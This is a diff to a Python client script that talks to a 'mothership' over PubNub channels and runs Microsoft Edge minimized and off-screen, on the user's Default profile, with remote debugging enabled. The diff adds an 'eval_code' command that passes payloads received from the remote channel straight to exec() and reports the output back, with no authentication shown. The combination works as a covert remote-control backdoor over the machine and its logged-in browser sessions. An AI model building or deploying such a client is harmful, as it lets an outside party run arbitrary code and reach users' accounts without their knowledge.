@@ -1,6 +1,6 @@
-# https://onecompiler.com/python#draft-acs9
 # 20260607-1336
 
+# https://onecompiler.com/python#draft-acs9
 # https://onecompiler.com/python/44me4y8rn
 
 # clear ; & "E:\__Binaries\Portable Python-3.10.5 x64\App\Python\python.exe" test.py
@@ -22,6 +22,9 @@
 
 # curl -s http://localhost:9222/json/list | findstr webSocketDebuggerUrl | findstr ws://
 
+import traceback
+import io
+from contextlib import redirect_stdout, redirect_stderr
 from datetime import datetime
 import time
 from pubnub.pubnub import PubNub
@@ -36,7 +39,6 @@ import inspect
 import time
 import sys
 import websocket
-import json
 import requests
 import tempfile
 import os
@@ -44,6 +46,10 @@ from pathlib import Path
 from datetime import datetime
 import random
 from urllib.parse import quote
+import json
+from pathlib import Path
+
+###
 
 def isempty(instr):
     return not (instr and instr.strip())
@@ -227,8 +233,8 @@ def wait_clientgetnextmessage(secs=1):
 
     return result
 
-def exec_builtin(tcmdname):
-    
+def exec_builtin(tcmdname, payload=""):
+
     if ( isempty(tcmdname) ):
         return None
     
@@ -243,6 +249,13 @@ def exec_builtin(tcmdname):
     elif ( tcmdname == "get_targets_list"):
         try:
             result = get_targets_list()
+        except Exception as exp:
+            logexception(exp)
+            result = None
+    elif ( tcmdname == "eval_code"):
+        try:
+            result = eval_code(payload)
+            # anchor
         except Exception as exp:
             logexception(exp)
             result = None
@@ -266,7 +279,7 @@ def client_loop(message):
         logmsg(f"client_loop: processing builtincmd {builtincmd}")
         
         if ( not isempty(builtincmd) ):
-            result = exec_builtin(builtincmd)
+            result = exec_builtin(builtincmd, payload)
             
     else:
     
@@ -354,15 +367,77 @@ def start_msedge(starturl="https://www.google.com/", edgeport=9222):
     cmdlineargs = '--new-window '+starturl+' --profile-directory=Default --remote-debugging-port='+str(edgeport)+' --remote-allow-origins=* --restore-last-session --window-position=2000,2000 --window-size=10,10'
     os.system("start /min msedge " + cmdlineargs)
 
+def exec_payload(payload, context, local_vars):
+    if ( isempty(payload) ): # anchor
+        return;
+
+    f_stdout = io.StringIO()
+    f_stderr = io.StringIO()
+
+    with redirect_stdout(f_stdout), redirect_stderr(f_stderr):
+        try:
+            exec(payload, context, local_vars)
+            local_vars = {k: v for k, v in local_vars.items() if isinstance(v, str)}
+
+            return f_stdout, f_stderr
+        except Exception as e:
+            traceback.print_exc()
+
+global_context = {}
+def eval_code(payload):
+    local_vars = {}
+    global global_context
+    f_stdout, f_stderr = exec_payload(payload, {}, local_vars)
+
+    try:
+        json_result = json.dumps(local_vars, default=lambda x: None)
+    except Exception as e:
+        logmsg(e)
+        json_result = None
+
+    result = {
+        "stdout": f_stdout.getvalue() if f_stdout else "",
+        "stderr": f_stderr.getvalue() if f_stderr else "",
+        "json_result": json_result
+    }
+
+    logmsg('eval_code result='+json.dumps(result))
+
+    return result
+
+def init_ws_url():
+    global relay_ws_url
+    relay_ws_url=get_relay_ws_url(debugport)
+
+    if ( isempty(relay_ws_url) ):
+        logmsg("could not set relay_ws_url -- exiting")
+        sys.exit(1)
+
+    logmsg(f"relay_ws_url={relay_ws_url}")
+
 ### 
 
+configfpath = ""
+
+if ( len(sys.argv) >= 2 ):
+    configfpath = sys.argv[1] 
+
+config = { "browser":"msedge", "batchid":str(random.randint(10000000, 99999999)) }
+
+try:
+    if not isempty(configfpath) and os.path.isfile(configfpath):
+        with open(configfpath, 'r', encoding='utf-8') as file:
+            config = json.load(file)
+except Exception as e:
+    print(e)
+
+engine_name = "PYTHON"
+browser = config['browser']
+
+relay_ws_url = ''
 delaytime = 3
 
-debugport = 9223
-if ( len(sys.argv) >= 2 ):
-    debugport = sys.argv[1]
-    if ( not isempty(debugport) ):
-        debugport = int(debugport)
+debugport = 9222 if browser == 'msedge' else '9223'
 
 timestamp = gettimestamp()
 script_full_path = Path(__file__).resolve()
@@ -377,9 +452,8 @@ logfname = script_fname + "_" + timestamp + ".log"
 logfpath = os.path.join(scriptdir_full_path, logfname)
 logf = open(logfpath, 'w', encoding='utf-8')
 
-batchid = str(random.randint(10000000, 99999999))
+batchid = config['batchid']
 clientid = get_clientid()
-
 mothership = get_mothership()
 
 if ( isempty(mothership) ):
@@ -392,12 +466,6 @@ if ( isempty(clientid) ):
 
 logmsg(f"starting script {script_fname} clientid {clientid} batchid {batchid} debugport {debugport} -- args: " + ' '.join(sys.argv[1:]) + f" -- {timestamp}")
 
-relay_ws_url=get_relay_ws_url(debugport)
-
-if ( isempty(relay_ws_url) ):
-    logmsg("could not set relay_ws_url -- exiting")
-    sys.exit(1)
-
 ###
 
 config = PNConfiguration()
@@ -406,10 +474,10 @@ config.subscribe_key = "sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd"
 config.uuid = f"clientid_{clientid}"
 
 pubnub = PubNub(config)
-mothership_channel = f"clientid_{clientid}_PYTHON_mothership"
-client_channel = f"clientid_{clientid}_PYTHON_client"
+mothership_channel = f"clientid_{clientid}_{engine_name}_mothership"
+client_channel = f"clientid_{clientid}_{engine_name}_client"
 
-subscription = pubnub.channel(client_channel).subscription()
+subscription = pubnub.channel(mothership_channel).subscription()
 
 ###
 
@@ -430,12 +498,13 @@ def publish_msg(msgdict, messageid):
     msgobjout["payload"] = msgdict
     msgobjout["MessageID"] = messageid
 
-    logmsg(f"pubnub: publishing message on {mothership_channel} -- messageid {messageid} msgdict {msgdict}")
-    result = pubnub.publish().channel(mothership_channel).message(msgobjout).pn_async(publish_callback)
+    logmsg(f"pubnub: publishing message on {client_channel} -- messageid {messageid} msgdict {msgdict}")
+    result = pubnub.publish().channel(client_channel).message(msgobjout).pn_async(publish_callback)
     return result
 
 # pubnub.publish().channel(mothership_channel).message(my_message).pn_async(publish_callback)
 
+# incomming messages
 def handle_message(message_event):
     pp = inspect.currentframe().f_code.co_name
 
